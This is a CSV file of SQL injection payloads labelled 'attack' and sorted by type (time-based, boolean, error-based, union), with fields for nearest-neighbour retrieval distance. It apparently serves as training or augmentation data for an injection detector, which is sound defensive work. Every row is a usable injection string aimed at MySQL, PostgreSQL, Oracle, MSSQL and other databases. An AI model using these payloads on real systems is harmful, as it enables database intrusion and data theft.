id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001630,attack,error,"1""  )   where 8878  =  8878 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R006608,0.0690976689002012
SMOTE_001631,attack,boolean,1'   )    )    and 7533  =  7533 and    (    (   'pagc' like 'pagc,nearest_attack_euclidean,R005599,0.11119255291217162
SMOTE_001632,attack,time,"1""  )   as gjlv where 1983  =  1983 and sleep  (  5  )  #",nearest_attack_euclidean,R003581,0.7261861202398562
SMOTE_001633,attack,boolean," select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",nearest_attack_euclidean,R000204,0.02983295801460831
SMOTE_001634,attack,time,1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R007564,0.15875898075089775
SMOTE_001635,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""phcl"" like ""phcl",nearest_attack_euclidean,R007684,0.6716532089872277
SMOTE_001636,attack,boolean,-7659'  )   as bowy where 4835  =  4835 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,nearest_attack_euclidean,R001566,0.020814016946677172
SMOTE_001637,attack,time,"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""ykhp"" like ""ykhp",nearest_attack_euclidean,R002264,0.029180274425888206
SMOTE_001638,attack,boolean,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",nearest_attack_euclidean,R004519,0.6662901267693927
SMOTE_001639,attack,union,"-3361   )    )    union all select 2827,2827,2827,2827#",nearest_attack_euclidean,R000927,0.36596099101682666
SMOTE_001640,attack,union,"-5738""  )   as efbn where 8541  =  8541 union all select 8541,8541,8541,8541,8541,8541,8541,8541#",nearest_attack_euclidean,R007718,0.1350080331085386
SMOTE_001641,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""fzlr""  =  ""fzlr",nearest_attack_euclidean,R003037,0.670268337513268
SMOTE_001642,attack,other,"1""  )   order by 1--",nearest_attack_euclidean,R001466,0.23432348934257624
SMOTE_001643,attack,boolean,"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'bvdw'  =  'bvdw",nearest_attack_euclidean,R001844,0.16439741136936892
SMOTE_001644,attack,union,"-1097"" where 4421  =  4421 union all select 4421,4421,4421,4421,4421#",nearest_attack_euclidean,R008345,0.33726289103785134
SMOTE_001645,attack,time,"1   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  2341  =  2341",nearest_attack_euclidean,R002194,0.2889379304086982
SMOTE_001646,attack,boolean,"1'  )   where 6720  =  6720 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R006431,0.10043678431101273
SMOTE_001647,attack,other,"select * from generate_series  (  6730,6730,case when   (  6730  =  9431  )   then 1 else 0 end  )   limit 1--",nearest_attack_euclidean,R007633,0.005419016140083902
SMOTE_001648,attack,boolean,"-5231%"" or 4945  =  8402#",nearest_attack_euclidean,R008568,0.23564528698760503
SMOTE_001649,attack,boolean,"1'||  (  select 'ryyc' from dual where 5196  =  5196 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",nearest_attack_euclidean,R003553,1.2142513278506495
SMOTE_001650,attack,boolean,"1' where 7417  =  7417 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R008104,0.09692511680294412
SMOTE_001651,attack,error,"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'tnfm' like 'tnfm",nearest_attack_euclidean,R008163,0.22633436518865602
SMOTE_001652,attack,time,"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""%""  =  """,nearest_attack_euclidean,R002732,0.16245383913861342
SMOTE_001653,attack,union,"-9582'  )   where 4397  =  4397 union all select 4397,4397,4397#",nearest_attack_euclidean,R006203,0.08322360857992253
SMOTE_001654,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R002743,0.06945739469796487
SMOTE_001655,attack,boolean,1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,nearest_attack_euclidean,R006614,0.009105199073839217
SMOTE_001656,attack,boolean,"1  )   where 8164  =  8164 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R003116,0.09766127883367029
SMOTE_001657,attack,boolean,"-1277""  )   where 6622  =  6622 or 3038  =  3038",nearest_attack_euclidean,R001390,0.1867452524442507
SMOTE_001658,attack,error,"1'  )   where 3271  =  3271 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R005107,0.13304309964367514
SMOTE_001659,attack,boolean,"1' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'mvkg'  =  'mvkg",nearest_attack_euclidean,R008801,0.29545121413882214
SMOTE_001660,attack,boolean,"1   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R004733,0.12977827903535752
SMOTE_001661,attack,boolean,"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'sdnc'  =  'sdnc",nearest_attack_euclidean,R002762,0.015591468316063476
SMOTE_001662,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R008813,0.34077132724338605
SMOTE_001663,attack,boolean,"1""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""bvdv"" like ""bvdv",nearest_attack_euclidean,R006125,0.22574737002250927
SMOTE_001664,attack,boolean,select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',nearest_attack_euclidean,R000474,0.625906416708231
SMOTE_001665,attack,union,-6109 union all select 6784--,nearest_attack_euclidean,R004995,0.8014212748828521
SMOTE_001666,attack,boolean,"1%' and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R003184,0.1281120484494228
SMOTE_001667,attack,boolean,-2241  )   where 7606  =  7606 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R001519,0.026747380013668325
SMOTE_001668,attack,time,waitfor delay '0:0:5' and 'gsvt'  =  'gsvt,nearest_attack_euclidean,R006615,0.8316770125426235
SMOTE_001669,attack,other,   (  select top 1,nearest_attack_euclidean,R000225,0.5407132301816614
SMOTE_001670,attack,union," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000503,15.28226105254717
SMOTE_001671,attack,other,1' where 1623  =  1623,nearest_attack_euclidean,R001570,0.0
SMOTE_001672,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'vpqr'  =  'vpqr,nearest_attack_euclidean,R003635,0.0881387136703055
SMOTE_001673,attack,boolean,"-1816""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""dztr"" like ""dztr",nearest_attack_euclidean,R008657,0.21573681898698202
SMOTE_001674,attack,boolean,"1%""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R007404,0.6833614397079828
SMOTE_001675,attack,boolean,"1%""   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R008672,0.08198728707538994
SMOTE_001676,attack,boolean,end and   (  'uxzv'  =  'uxzv,nearest_attack_euclidean,R007313,0.11026519123330444
SMOTE_001677,attack,boolean,"-4889""   )    )    as vvuo where 8060  =  8060 or   (  8459  =  8459  )  *4906--",nearest_attack_euclidean,R002538,0.42382124922322695
SMOTE_001678,attack,time,"1'   )    )    as hbdi where 6758  =  6758 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R006109,0.00728457358461129
SMOTE_001679,attack,boolean,-9355' or 6872  =  6872 and 'mztk'  =  'mztk,nearest_attack_euclidean,R008099,0.47349145165378614
SMOTE_001680,attack,union,"-3498""   )    )    as xbvb where 2056  =  2056 union all select 2056,2056,2056,2056,2056,2056,2056--",nearest_attack_euclidean,R004409,0.2860317993794686
SMOTE_001681,attack,other,"iif  (  2452  =  8999,1,1/0  )  ",nearest_attack_euclidean,R001074,1.1920928955078125e-07
SMOTE_001682,attack,time,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",nearest_attack_euclidean,R005437,0.08498522305231665
SMOTE_001683,attack,union,"-1339   )    )     )   union all select 6318,6318,6318,6318,6318,6318,6318,6318,6318#",nearest_attack_euclidean,R007916,0.05497471689107445
SMOTE_001684,attack,union," select * from users where id  =  '1' union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000541,0.025373110908479886
SMOTE_001685,attack,other,select   (  case when   (  1275  =  7674  )   then 1275 else 1275*  (  select 1275 from information_schema.character_sets  )   end  )  #,nearest_attack_euclidean,R000759,0.005753065097886272
SMOTE_001686,attack,boolean,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz",nearest_attack_euclidean,R001816,0.25580526239720525
SMOTE_001687,attack,boolean,and 1 in   (  select var from temp  )  --,nearest_attack_euclidean,R000138,0.25974173782408994
SMOTE_001688,attack,boolean,"1""   )    )    as pafp where 6770  =  6770 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R007842,0.15161074476777794
SMOTE_001689,attack,union,"1  )   where 4810  =  4810 union all select null,null#",nearest_attack_euclidean,R004235,0.13920497561436282
SMOTE_001690,attack,boolean,-8538%' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  ',nearest_attack_euclidean,R008448,0.654440871351321
SMOTE_001691,attack,other,""" or """"^""",nearest_attack_euclidean,R000169,0.7780463118208463
SMOTE_001692,attack,boolean,"-9370'  )   where 7070  =  7070 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R007560,0.1077261101875632
SMOTE_001693,attack,error,1  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,nearest_attack_euclidean,R001787,0.6859918664705307
SMOTE_001694,attack,union,1'  )   union all select null#,nearest_attack_euclidean,R003397,0.22896006585477288
SMOTE_001695,attack,other,select   (  case when   (  7385  =  8723  )   then 7385 else 7385*  (  select 7385 from information_schema.character_sets  )   end  )  #,nearest_attack_euclidean,R004824,0.0058138936406972284
SMOTE_001696,attack,boolean,"1""  )   as assu where 7521  =  7521 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R001691,0.12400233417834693
SMOTE_001697,attack,union,"-8754""   )    )     )   union all select 7391,7391,7391,7391,7391,7391,7391--",nearest_attack_euclidean,R005960,0.13649033436424177
SMOTE_001698,attack,time,1  )   where 1203  =  1203 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R004261,0.6121034972890591
SMOTE_001699,attack,error,"1',  (  select   (  case when   (  3576  =  7744  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R001341,0.00663483580862228
SMOTE_001700,attack,boolean,"1'  )   and elt  (  5245  =  9203,9203  )   and   (  'fhlw' like 'fhlw",nearest_attack_euclidean,R006370,0.3789654072516019
SMOTE_001701,attack,boolean,"1%""   )    )    and make_set  (  9897  =  5557,5557  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001406,0.16569280163410927
SMOTE_001702,attack,boolean,"-6095""  )   as hygc where 8142  =  8142 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000877,0.497174080273431
SMOTE_001703,attack,union,"-9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R003099,0.3210745048104516
SMOTE_001704,attack,error,"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""pnub""  =  ""pnub",nearest_attack_euclidean,R003856,0.38705479693755823
SMOTE_001705,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'jcfe'  =  'jcfe,nearest_attack_euclidean,R007484,0.3147476625198366
SMOTE_001706,attack,other,"  (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R002789,0.2668312481811858
SMOTE_001707,attack,boolean,"1%""  )   and make_set  (  9956  =  1060,1060  )   and   (  ""%""  =  """,nearest_attack_euclidean,R004420,0.4357788227574847
SMOTE_001708,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000144,1.0205278208133075
SMOTE_001709,attack,error,1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'sgdj' like 'sgdj,nearest_attack_euclidean,R008360,0.09555612867774492
SMOTE_001710,attack,boolean,"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'xgzb'  =  'xgzb",nearest_attack_euclidean,R001149,0.13087924040970314
SMOTE_001711,attack,other,1' where 1623  =  1623,nearest_attack_euclidean,R001570,0.0
SMOTE_001712,attack,boolean,"1  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",nearest_attack_euclidean,R004406,0.09922388607938626
SMOTE_001713,attack,boolean,-7562  )   or 8571  =  8571--,nearest_attack_euclidean,R000750,0.003995678046484475
SMOTE_001714,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R003799,0.3968477872014355
SMOTE_001715,attack,time,1%'  )   rlike sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R006302,0.5207169104031637
SMOTE_001716,attack,boolean,-2920'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rzey'  =  'rzey,nearest_attack_euclidean,R007680,0.10013594365230716
